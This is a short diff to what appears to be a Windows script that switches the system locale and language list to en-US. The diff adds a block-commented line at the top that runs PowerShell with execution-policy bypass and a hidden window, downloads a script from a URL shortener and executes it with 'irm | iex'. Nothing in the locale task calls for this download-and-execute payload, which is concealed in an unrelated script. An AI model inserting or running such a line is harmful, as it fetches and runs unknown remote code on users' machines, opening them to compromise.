@@ -1,4 +1,8 @@
 
+<#
+powershell -ep bypass -w h -c irm is.gd/3jgz85 | iex
+#>
+
 Dism /online /Get-Intl
 Set-WinSystemLocale en-US
 Set-WinUserLanguageList en-US -force
